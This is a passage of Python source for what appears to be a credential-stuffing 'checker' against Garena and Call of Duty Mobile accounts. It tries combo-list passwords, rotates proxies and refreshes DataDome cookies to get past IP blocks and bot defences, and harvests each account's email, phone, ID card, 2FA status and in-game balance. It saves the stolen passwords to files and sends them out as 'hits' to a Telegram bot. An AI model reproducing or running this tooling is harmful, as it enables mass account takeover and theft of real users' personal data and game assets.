    except Exception as e:
        pass


def save_account_details_full(account, details, codm_info=None, password=None, result_folder='Results'):
    """Save full account details to full_details.txt"""
    try:
        os.makedirs(result_folder, exist_ok=True)
        
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
        shell_balance = details['profile']['shell_balance']
        country = details['personal']['country']
        is_clean = details.get('is_clean', False)

        with open(os.path.join(result_folder, 'full_details.txt'), 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"Account: {account}\n")
            f.write(f"Password: {password}\n")  
            f.write(f"UID: {details['uid']}\n")
            f.write(f"Username: {details['username']}\n")
            f.write(f"Nickname: {details['nickname']}\n")
            f.write(f"Email: {details['email']}\n")
            f.write(f"Phone: {details['personal']['mobile_no']}\n")
            f.write(f"Country: {country}\n")
            f.write(f"Shell Balance: {shell_balance}\n")
            f.write(f"Account Status: {details['status']['account_status']}\n")
            f.write(f"Is Clean: {is_clean}\n")
            if codm_info:
                f.write(f"CODM Name: {codm_name}\n")
                f.write(f"CODM UID: {codm_uid}\n")
                f.write(f"CODM Region: {codm_region}\n")
                f.write(f"CODM Level: {codm_level}\n")
            f.write("=" * 60 + "\n\n")
            
    except Exception as e:
        pass

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'binds': [],
        'game_info': []
    }

    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('***') and '@' in email and not email.endswith('@gmail.com') and '****' not in email:
        account_info['binds'].append('Email')
    
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')
    if user_info.get('email_v', 0) == 1 or len(account_info['binds']) > 0:
        account_info['is_clean'] = False
        account_info['bind_status'] = f"Bound ({', '.join(account_info['binds']) or 'Email Verified'})"
    else:
        account_info['is_clean'] = True
        account_info['bind_status'] = "Clean"

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")
    
    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info


def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', telegram_config=None):
    try:
        MAX_IP_BLOCK_RETRIES = 3   # 3 fast retries with proxy rotation
        v1, v2, new_datadome = None, None, None

        for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)

            v1, v2, new_datadome = prelogin(session, account, datadome_manager, telegram_config=telegram_config)

            if v1 == "IP_BLOCKED":
                logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — rotating proxy...")
                new_proxy = geo_rotator.force_rotate()
                session.proxies.update(geo_rotator.get_proxies())
                # Refresh datadome on new proxy
                fresh_dd = get_datadome_cookie(session)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                continue

            if v1 == "CONN_ERROR":
                logger.warning(f"[RETRY] Connection error attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — smart rotating...")
                geo_rotator.smart_rotate()
                session.proxies.update(geo_rotator.get_proxies())
                continue

            break  # prelogin succeeded or hard-failed — exit retry loop

        if v1 in ("IP_BLOCKED", "CONN_ERROR"):
            logger.error(f"[RETRY] Exhausted {MAX_IP_BLOCK_RETRIES} retries for {account} — skipping")
            live_stats.update_stats(valid=False)
            return f"🚨 Proxy exhausted - Skipped after {MAX_IP_BLOCK_RETRIES} retries"

        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return ""
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        
        sso_key = login(session, account, password, v1, v2)
        
        if not sso_key:
            live_stats.update_stats(valid=False)
            return ""
        
        # ── account/init with retry on 403 ───────────────────────
        account_data = None
        for init_attempt in range(4):  # up to 4 tries
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {
                'accept': '*/*',
                'referer': 'https://account.garena.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
            }
            if cookie_header:
                headers['cookie'] = cookie_header

            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=10)

            if response.status_code == 403:
                logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/4")
                if datadome_manager.handle_403(session, telegram_config=telegram_config):
                    # Rotated and got new datadome — wait then retry the init request
                    logger.info(f"[INIT] Proxy rotated — retrying account/init...")
                    time.sleep(0.02 + init_attempt * 0.02)
                    session.proxies.update(geo_rotator.get_proxies())
                    continue
                else:
                    live_stats.update_stats(valid=False)
                    return f"🚫 Banned (Cookie flagged)"

            try:
                account_data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      ✘ Invalid JSON response from account init")
                live_stats.update_stats(valid=False)
                return ""
            break  # success

        if account_data is None:
            logger.error(f"[INIT] ❌ Failed account/init after all retries — skipping")
            live_stats.update_stats(valid=False)
            return f"🚨 IP Blocked - account/init failed after retries"

        if 'error' in account_data:
            if account_data.get('error') == 'ACCOUNT DOESNT EXIST':
                live_stats.update_stats(valid=False)
                return ""
            live_stats.update_stats(valid=False)
            logger.error(f"      ✘ Error fetching details: {account_data['error']}")
            return ""
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        login_history = account_data.get('login_history') or []
        last_login_ip = None
        last_login_where = None
        last_login_ts = None

        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ip = entry.get('ip') or entry.get('login_ip') or entry.get('ip_address')
                last_login_where = entry.get('country') or entry.get('location') or entry.get('region')
                last_login_ts = entry.get('timestamp')
        
        # Skip disk scan — already extracted what we can from the API response
        if not last_login_ip or not last_login_where:
            pass  # N/A is acceptable; disk scan removed (was O(n) per account — major slowdown)
        
        def fmt_ts(ts):
            try:
                ts_int = int(ts)
                return datetime.fromtimestamp(ts_int, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            except Exception:
                return 'Unknown'

        last_login_str = fmt_ts(last_login_ts) if last_login_ts else 'Unknown'
        details['last_login'] = last_login_str
        details['last_login_where'] = last_login_where or 'N/A'
        ip_for_msg = last_login_ip or account_data.get('init_ip') or 'N/A'
        details['ip_for_msg'] = ip_for_msg
        if account_data.get('country'):
            details['country'] = account_data.get('country')
        
        has_codm, codm_info = check_codm_account(session, account)
        
        def is_codm_invalid(info):
            if not info:
                return True
            if isinstance(info, str):
                return "error" in info.lower()
            if isinstance(info, dict):
                invalid_values = ["", "N/A", "NONE", "NULL", "ERROR"]
                if all(str(v).strip().upper() in invalid_values for v in info.values()):
                    return True
                if str(info.get('codm_nickname', '')).strip().upper() in invalid_values:
                    return True
            return False

        if not has_codm or is_codm_invalid(codm_info):
            live_stats.update_stats(valid=True, clean=details.get('is_clean', False), has_codm=False)
            save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)
            save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)

            # ── Shell balance early-send ───────────────────────────────
            # Even without CODM, if the account has Garena Shell balance
            # send a Telegram hit immediately (bypass level filter entirely)
            if telegram_config:
                _shell = details.get('profile', {}).get('shell_balance', 0)
                try:
                    _shell_int = int(str(_shell).strip()) if str(_shell).strip().isdigit() else 0
                except Exception:
                    _shell_int = 0
                if _shell_int > 0:
                    tg_token  = telegram_config[0]
                    tg_chat   = telegram_config[1]
                    tg_clean_filter = telegram_config[4] if len(telegram_config) > 4 else 'both'
                    _is_clean = details.get('is_clean', False)
                    _clean_pass = (tg_clean_filter == 'both' or
                                   (tg_clean_filter == 'clean' and _is_clean) or
                                   (tg_clean_filter == 'notclean' and not _is_clean))
                    if tg_token and tg_chat and _clean_pass:
                        _email   = details.get('email', 'N/A')
                        _uname   = details.get('username', account)
                        _country = details.get('personal', {}).get('country', 'N/A')
                        _mobile  = details.get('personal', {}).get('mobile_no', 'N/A')
                        _2fa     = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
                        _auth    = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
                        _clean_tag = '✅ CLEAN' if _is_clean else '❌ NOT CLEAN'
                        _ev_flag = details.get('email_verified') if isinstance(details.get('email_verified'), bool) else False
                        _ev      = "Verified" if _ev_flag else "Not Verified"
                        shell_msg = (
                            f'💰 <b>SHELL BALANCE HIT!</b>\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'👤 <b>Username:</b> <code>{_uname}</code>\n'
                            f'🔑 <b>Password:</b> <code>{password}</code>\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'💰 <b>Garena Shell:</b> <b>{_shell_int:,}</b> Shells\n'
                            f'🎮 <b>CODM:</b> Not linked\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'🔒 <b>Security</b>\n'
                            f'   📧 Email: <code>{_email}</code> ({_ev})\n'
                            f'   📱 Mobile Bound: {"Yes" if _mobile and str(_mobile).strip() else "No"}\n'
                            f'   🔐 2FA: {_2fa}\n'
                            f'   🛡️ Auth App: {_auth}\n'
                            f'   🌍 Country: {_country}\n'
                            f'   📊 Status: {_clean_tag}\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'⚡ by @Yukiii_ii'
                        )
                        send_telegram_message(tg_token, tg_chat, shell_msg)
            return ""
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
        
        save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)
        save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)

        _codm_lvl = codm_info.get('codm_level', 0) if has_codm and codm_info else 0
        _codm_rgn = codm_info.get('region', '') if has_codm and codm_info else ''
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm, codm_level=_codm_lvl, region=_codm_rgn)
        
        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_verified_flag = details.get('email_verified') if isinstance(details.get('email_verified'), bool) else False
        email_ver = "Verified" if email_verified_flag else "Not Verified"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_display = mobile if mobile and str(mobile).strip() else "None"
        mobile_bound = f"{Colors.GREEN}Yes{Colors.RESET}" if mobile and str(mobile).strip() else f"{Colors.RED}No{Colors.RESET}"
        email_verified_display = f"{Colors.GREEN}Yes{Colors.RESET}" if email_verified_flag else f"{Colors.RED}No{Colors.RESET}"

        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        acc_country = details.get('personal', {}).get('country', 'N/A')

        authenticator_enabled = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        two_step_enabled = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
        clean_status = f"{Colors.GREEN}CLEAN{Colors.RESET}" if details.get('is_clean') else f"{Colors.RED}NOT CLEAN{Colors.RESET}"

        codm_nickname = codm_info.get('codm_nickname', 'N/A') if has_codm else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if has_codm else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if has_codm else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if has_codm else 'N/A'

        mess = f"""
{Colors.LIGHTGREEN_EX}[+] Garena Info{Colors.RESET}
      {Colors.CYAN}Username     :{Colors.RESET} {Colors.WHITE}{username}{Colors.RESET}
      {Colors.CYAN}Password     :{Colors.RESET} {Colors.WHITE}{password}{Colors.RESET}
      {Colors.CYAN}Garena Shell :{Colors.RESET} {Colors.YELLOW}{shell}{Colors.RESET}
{Colors.LIGHTGREEN_EX}[+] CODM Info{Colors.RESET}
      {Colors.CYAN}Nickname :{Colors.RESET} {Colors.WHITE}{codm_nickname}{Colors.RESET}
      {Colors.CYAN}UID      :{Colors.RESET} {Colors.WHITE}{codm_uid}{Colors.RESET}
      {Colors.CYAN}Level    :{Colors.RESET} {Colors.WHITE}{codm_level}{Colors.RESET}
      {Colors.CYAN}Region   :{Colors.RESET} {Colors.WHITE}{codm_region}{Colors.RESET}
{Colors.LIGHTGREEN_EX}[+] Security{Colors.RESET}
      {Colors.CYAN}Mobile No      :{Colors.RESET} {Colors.WHITE}{mobile_display}{Colors.RESET}
      {Colors.CYAN}Email          :{Colors.RESET} {Colors.WHITE}{email} ({email_ver}){Colors.RESET}
      {Colors.CYAN}Mobile Bound   :{Colors.RESET} {mobile_bound}
      {Colors.CYAN}Email Verified :{Colors.RESET} {email_verified_display}
      {Colors.CYAN}Authenticator  :{Colors.RESET} {authenticator_enabled}
      {Colors.CYAN}2FA Enabled    :{Colors.RESET} {two_step_enabled}
      {Colors.CYAN}Country        :{Colors.RESET} {Colors.WHITE}{acc_country}{Colors.RESET}
      {Colors.CYAN}Account Status :{Colors.RESET} {clean_status}

  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
  {Colors.WHITE}CONFIG BY: @Yukiii_ii{Colors.RESET}
""".strip()

        print(mess) if not BOT_MODE else None

        # ── Telegram Notification ──────────────────────────────────────────────
        if telegram_config:
            tg_token, tg_chat, tg_thresholds, tg_mention = telegram_config[0], telegram_config[1], telegram_config[2], telegram_config[3]
            tg_clean_filter = telegram_config[4] if len(telegram_config) > 4 else 'both'
            try:
                lvl = int(str(codm_level).strip()) if str(codm_level).strip().isdigit() else 0
            except Exception:
                lvl = 0

            # ── Shell balance check ────────────────────────────────
            # Convert shell to int safely (could be 'N/A', int, or string)
            try:
                shell_int = int(str(shell).strip()) if str(shell).strip().isdigit() else 0
            except Exception:
                shell_int = 0
            has_shell_balance = shell_int > 0

            thr_list = tg_thresholds if isinstance(tg_thresholds, list) else [tg_thresholds]
            is_clean = details.get('is_clean', False)
            clean_pass = (tg_clean_filter == 'both' or
                          (tg_clean_filter == 'clean' and is_clean) or
                          (tg_clean_filter == 'notclean' and not is_clean))

            # ── Send if: level passes threshold  OR  has shell balance ──
            # Shell balance accounts bypass the level filter entirely
            level_pass = any(lvl >= t for t in thr_list)
            should_send = tg_token and tg_chat and clean_pass and (level_pass or has_shell_balance)

            if should_send:
                clean_tag   = '✅ CLEAN' if is_clean else '❌ NOT CLEAN'
                # Shell tag — highlight prominently if balance > 0
                shell_tag   = f'💰 <b>{shell_int:,}</b> Shells' if has_shell_balance else f'0 Shells'
                # Hit reason tag — show why this was sent
                if has_shell_balance and not level_pass:
                    hit_reason = f'💰 Shell Balance Hit (Level {lvl} — bypassed threshold)'
                elif has_shell_balance and level_pass:
                    hit_reason = f'🎯 Level + Shell Hit'
                else:
                    hit_reason = f'🎯 Level Hit'

                tg_msg = (
                    f'🎯 <b>NEW HIT FOUND!</b>  [{hit_reason}]\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'👤 <b>Username:</b> <code>{username}</code>\n'
                    f'🔑 <b>Password:</b> <code>{password}</code>\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'💰 <b>Garena Shell:</b> {shell_tag}\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'🎮 <b>CODM Info</b>\n'
                    f'   📛 Nickname: <code>{codm_nickname}</code>\n'
                    f'   🆔 UID: <code>{codm_uid}</code>\n'
                    f'   ⭐ Level: <code>{codm_level}</code>\n'
                    f'   🌏 Region: <code>{codm_region}</code>\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'🔒 <b>Security</b>\n'
                    f'   📧 Email: <code>{email}</code> ({email_ver})\n'
                    f'   📱 Mobile Bound: {"Yes" if mobile and str(mobile).strip() else "No"}\n'
                    f'   🔐 2FA: {two_step_enabled}\n'
                    f'   🛡️ Auth App: {authenticator_enabled}\n'
                    f'   🌍 Country: {acc_country}\n'
                    f'   📊 Status: {clean_tag}\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'⚡ by @Yukiii_ii'
                )
                send_telegram_message(tg_token, tg_chat, tg_msg)

        return ""

    except Exception as e:
        logger.error(f"      💥 Unexpected error processing: {e}")
        live_stats.update_stats(valid=False)
        return ""

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            bot_console.print(f"[cyan] NO DUPLICATES LINES FOUND {os.path.basename(file_path)}.[/cyan]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        bot_console.print(f"[green][+] Successfully removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except FileNotFoundError:
        bot_console.print(f"[red][ERROR] File not found: {file_path}[/red]")
        return False
    except Exception as e:
        bot_console.print(f"[red][ERROR] Failed to remove duplicates from {os.path.basename(file_path)}: {e}[/red]")
        return False


# ══════════════════════════════════════════════════════════════
#  TELEGRAM HELPERS
# ══════════════════════════════════════════════════════════════
TELEGRAM_CONFIG_FILE = "telegram_config.json"

def load_telegram_config() -> dict | None:
    """Load saved Telegram hits config from disk."""
    if os.path.exists(TELEGRAM_CONFIG_FILE):
        try:
            with open(TELEGRAM_CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return None

def save_telegram_config(config: dict):
    """Save Telegram hits config to disk."""
    with open(TELEGRAM_CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2)

def send_telegram_message(bot_token: str, chat_id, message: str, parse_mode: str = "HTML"):
    """Send a Telegram message. Returns message_id on success, None on failure."""
    try:
        url  = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": parse_mode}
        resp = requests.post(url, data=data, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("result", {}).get("message_id")
    except Exception:
        pass
    return None

def delete_telegram_message(bot_token: str, chat_id, message_id, delay: int = 5):
    """Delete a Telegram message after a delay (seconds)."""
    if not message_id:
        return
    try:
        time.sleep(delay)
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/deleteMessage",
            data={"chat_id": chat_id, "message_id": message_id},
            timeout=10
        )
    except Exception:
        pass

def send_and_delete(bot_token: str, chat_id, message: str, delay: int = 20, parse_mode: str = "HTML"):
    """Send a message then auto-delete it after delay seconds (background thread)."""
    def _do():
        msg_id = send_telegram_message(bot_token, chat_id, message, parse_mode)
        if msg_id:
            delete_telegram_message(bot_token, chat_id, msg_id, delay=delay)
    threading.Thread(target=_do, daemon=True).start()


def setup_telegram():
    """
    Setup Telegram hits notifications.
    Bot token is taken from the hardcoded BOT_TOKEN constant — no prompt needed.
    Only asks for: Chat ID, level threshold, mention username, clean filter.
    Returns (bot_token, chat_id, level_threshold, mention_username, clean_filter)
    """
    from rich.prompt import Confirm, Prompt
    from rich import box as rbox
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.align import Align

    # Always use the hardcoded token
    bot_token = BOT_TOKEN

    bot_console.print()
    bot_console.print(Panel(Align.center(Text('📱 Telegram Hits Config', style='bold cyan')),
                        border_style='cyan', box=rbox.ROUNDED, width=80))

    # ── Load existing config ───────────────────────────────────
    existing = load_telegram_config()
    _CF_MAP = {'clean': '✅ CLEAN only', 'notclean': '❌ NOT CLEAN only', 'both': '🔄 BOTH'}

    if existing:
        bot_console.print(Panel(
            f"[green]✅ Found existing configuration[/green]\n"
            f"[yellow]Chat ID:[/yellow]         [white]{existing.get('chat_id', 'N/A')}[/white]\n"
            f"[yellow]Level Threshold:[/yellow] [white]{', '.join(f'{t}+' for t in (existing.get('level_threshold', [100]) if isinstance(existing.get('level_threshold', [100]), list) else [existing.get('level_threshold', 100)]))}[/white]\n"
            f"[yellow]Notify for:[/yellow]      [white]{_CF_MAP.get(existing.get('clean_filter', 'both'), '🔄 BOTH')}[/white]\n"
            f"[yellow]Mention:[/yellow]         [white]{existing.get('mention_username', 'None')}[/white]",
            title='[bold green]Current Config[/bold green]', border_style='green', width=80
        ))
        if Confirm.ask('[bold cyan]Use existing configuration?[/bold cyan]'):
            raw = existing.get('level_threshold', [100])
            thr = raw if isinstance(raw, list) else [raw]
            return (bot_token, existing['chat_id'],
                    thr, existing.get('mention_username', ''),
                    existing.get('clean_filter', 'both'))

    # ── Chat ID ────────────────────────────────────────────────
    bot_console.print(Panel(
        '[dim]Enter the Chat/Channel ID where hits will be sent.\n'
        'Get it via @userinfobot or use the format -100xxxxxxxxxx[/dim]',
        title='[bold blue]Setup Instructions[/bold blue]', border_style='blue', width=80
    ))
    chat_id = Prompt.ask('[bold cyan]💬 Chat/Channel ID[/bold cyan]').strip()

    # ── Level threshold ────────────────────────────────────────
    bot_console.print(Panel(
        '[bold yellow]Select level(s) to get notified for:[/bold yellow]\n'
        '[dim]You can pick multiple — type numbers separated by comma (e.g. 3,4)[/dim]',
        border_style='yellow', width=80))
    tbl = Table(show_header=False, box=rbox.SIMPLE, width=36)
    tbl.add_column('', style='bold white', width=4)
    tbl.add_column('', style='dim white')
    level_map    = {'1': 100, '2': 200, '3': 300, '4': 400, '5': 1}
    level_labels = {'1': 'Level 100+', '2': 'Level 200+', '3': 'Level 300+',
                    '4': 'Level 400+', '5': 'ALL levels'}
    for k, v in level_labels.items():
        tbl.add_row(f'[{k}]', v)
    bot_console.print(tbl)

    while True:
        lc_raw     = Prompt.ask('[bold cyan]Choose level(s)[/bold cyan]', default='1').strip()
        lc_choices = [x.strip() for x in lc_raw.split(',') if x.strip() in level_map]
        if lc_choices:
            break
        bot_console.print('[red]Invalid choice — use numbers 1-5[/red]')

    thresholds     = [1] if '5' in lc_choices else sorted(set(level_map[k] for k in lc_choices))
    thresh_display = 'ALL' if thresholds == [1] else ', '.join(f'{t}+' for t in thresholds)

    # ── Mention username ───────────────────────────────────────
    mention = Prompt.ask(
        '[bold cyan]📣 Telegram username to mention on hits (leave blank to skip)[/bold cyan]',
        default=''
    ).strip()

    # ── Clean filter ───────────────────────────────────────────
    bot_console.print(Panel(
        '[bold yellow]Which accounts trigger a notification?[/bold yellow]',
        border_style='yellow', width=80))
    ctbl = Table(show_header=False, box=rbox.SIMPLE, width=30)
    ctbl.add_column('', style='bold white', width=4)
    ctbl.add_column('', style='dim white')
    ctbl.add_row('[1]', '✅ CLEAN only')
    ctbl.add_row('[2]', '❌ NOT CLEAN only')
    ctbl.add_row('[3]', '🔄 BOTH (all hits)')
    bot_console.print(ctbl)
    clean_choice        = Prompt.ask('[bold cyan]Choose[/bold cyan]', choices=['1', '2', '3'], default='3')
    clean_filter        = {'1': 'clean', '2': 'notclean', '3': 'both'}[clean_choice]
    clean_filter_display = {'clean': '✅ CLEAN only', 'notclean': '❌ NOT CLEAN only', 'both': '🔄 BOTH'}[clean_filter]

    # ── Test message ───────────────────────────────────────────
    test_msg = (
        f'<b>🎯 Test Message</b>\n\n'
        f'<b>✅ Bot is working!</b>\n'
        f'<b>🎮 Level threshold:</b> <code>{thresh_display}</code>\n'
        f'<b>📊 Notify for:</b> <code>{clean_filter_display}</code>\n'
        f'<b>⚡ Ready to receive hits!</b>'
    )
    bot_console.print(Panel('[yellow]🧪 Sending test message...[/yellow]', border_style='yellow', width=80))

    if send_telegram_message(bot_token, chat_id, test_msg):
        bot_console.print(Panel('[bold green]✅ Test message sent! Check your Telegram.[/bold green]',
                            border_style='green', width=80))
        config = {
            'bot_token':        bot_token,
            'chat_id':          chat_id,
            'level_threshold':  thresholds,
            'mention_username': mention,
            'clean_filter':     clean_filter,
            'enabled':          True
        }
        if Confirm.ask('[bold green]💾 Save configuration?[/bold green]'):
            save_telegram_config(config)
            bot_console.print(Panel('[bold green]📁 Saved![/bold green]', border_style='green', width=80))
        return (bot_token, chat_id, thresholds, mention, clean_filter)
    else:
        bot_console.print(Panel('[bold red]❌ Failed — check your Chat ID and make sure the bot is added to the chat.[/bold red]',
                            border_style='red', width=80))
        return (None, None, None, None, None)


# ========== DISPLAY BANNER ==========
def print_banner():
    lines = [
        f'{W}',
        f'{W}{B}[{R}★{W}] {CY}{Style.BRIGHT}TYRAAA CUUTIEEEE{Style.RESET_ALL} {B}[{R}★{W}]',
        f'{W}{GR}                          :::!~!!!!!:.',
        f'{W}{GR}                     .xUHWH!! !!?M88WHX:.',
        f'{W}{GR}                  .X*#M@$!  !X!M$$$$$WWx:',
        f'{W}{GR}                  :!!!!!!?H! :!$!$$$$$$$$8X:',
        f'{W}{GR}                :!~::!H![   ~.U$X!?W$$$$MM!',
        f'{W}{GR}                  ~!~!!!!~~ .:XW$$$U!!?$WMM!',
        f'{W}{GR}               !:~~~ .:!M*T#$$$WX??#MRRMMM!',
        f'{W}{GR}               ~?WuxiW*     *#$$$8!!!!??!!!',
        f"{W}{GR}             :X- M$$$$  {R}  *{GR}  '#T#$~!8$WUXU~",
        f"{W}{GR}          :%'  ~%$Mm:         ~!~ ?$$$$$",
        f'{W}{GR}          :! .-   ~T$8xx.  .xWW- ~""##*\'\'',
        f"{W}{GR}  .....   -~~:<  !    ~?T$@@W@*?$ {R} * {GR} /'",
        f"{W}{GR} W$@@M!!! .!~~ !!     .:XUW$W!~ '*~:   :",
        f"{W}{GR} %^~~'.:x%'!!  !H:   !WM$$$$Ti.: .!WUnn!",
        f'{W}{GR} :::~:!. :X~ .: ?H.!u $$$$$$!W:U!T$M~',
        f"{W}{GR} .~~   :X@!.-~   ?@WTWo('*$W$TH$!",
        f'{W}{GR} Wi.~!X$?!-~    : ?$$$B$Wu(***$RM!',
        f'{W}{GR} $R@i.#~ !     :   -$$$$$%$Mm$;',
        f'{W}{GR} ?MXT@Wx.~    :     ~##$$$M~',
        f'{W} ',
        f'\033[1m{R}{W}{RED}{B} {W}{RED} Garena Bind Checker: by Tyraa Cutieee {B} {W}{R}\033[0m'
    ]

    for line in lines:
        print(line)
        pass  # removed sleep — no visible difference
    print()

def create_thread_session(cookie_manager, datadome_manager):
    """Create a fast cloudscraper session with keep-alive and pooled connections."""
    sess = cloudscraper.create_scraper()
    # ── Optimised adapter: max pooling for speed ────────────────
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=8,
        pool_maxsize=20,      # max parallel connections pooled = fewer reconnects
        max_retries=1,        # one retry for transient failures
    )
    sess.mount("http://",  adapter)
    sess.mount("https://", adapter)
    # ── Keep-alive: reuse the same TCP connection for all requests in a thread ──
    sess.headers.update({
        "Connection":       "keep-alive",
        "Accept-Encoding":  "gzip, deflate, br",
        "Accept":           "application/json, text/plain, */*",
    })
    # Set proxy FIRST so datadome fetch also goes through this thread's proxy
    sess.proxies.update(geo_rotator.get_proxies())
    valid_cookies = cookie_manager.get_valid_cookies()
    if valid_cookies:
